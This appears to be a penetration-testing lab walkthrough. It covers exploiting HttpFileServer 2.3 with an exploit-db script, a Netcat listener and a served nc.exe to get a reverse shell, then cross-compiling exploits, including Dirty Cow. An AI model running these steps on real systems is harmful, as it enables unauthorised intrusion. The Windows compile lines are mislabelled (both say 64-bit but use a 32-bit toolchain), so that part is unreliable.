
---

## Fixing Exploits

For this part, we will be solving the lab that is labeled Fixing Exploits

We will begin our Nmap scan:`Nmap -Pn -A -v (target Ip)`

We will find HttpFileServer httpd 2.3 running on port 80.

Using searchsploit, we will search for an exploit related to this service: `searchsploit HTTP File Server 2.3 -w` We will get multiple results but we will be using this one: "windows/remote/39161.py"

We visit its exploit-db page and see the actual python file that we are going to use. In the python file, the developer is telling us how to use it.

We will need to do three things, change the local IP address and the local port number written in the exploit file to match our needs. 

We will need to run a simple HTTP server using python that has the Netcat execution file in it:"nc.exe" . On a third command page, we will need to start Netcat listening on the port that we specified in the exploit file: `nc -nvlp 4444`

Then, we run our exploit: `python ./39161.py (target IP) 80`

We need to make sure that the HTTP server is downloading the Netcat execution file and if we returned back to where Netcat is listening on the port, we should have a reverse shell. If that didn't work, we need to run the exploit multiple times until we get a shell session.


---

## Cross-Compiling Exploits

### Compile for Windows
If we have a C code that we want to compile that would target a 64-bit Windows system, we will do the following: `i686-w64-mingw32-gcc (exploit_code.c) -o (output file)`
If we want to target 64-bit Windows system, we will do the following: `i686-w64-mingw32-gcc (exploit_code.c) -o (output file) -lws2_32`

### Compile for Linux

To compile Dirty Cow exploit for example, we do: `gcc -pthread dirty.c -o dirty -lcrypt`
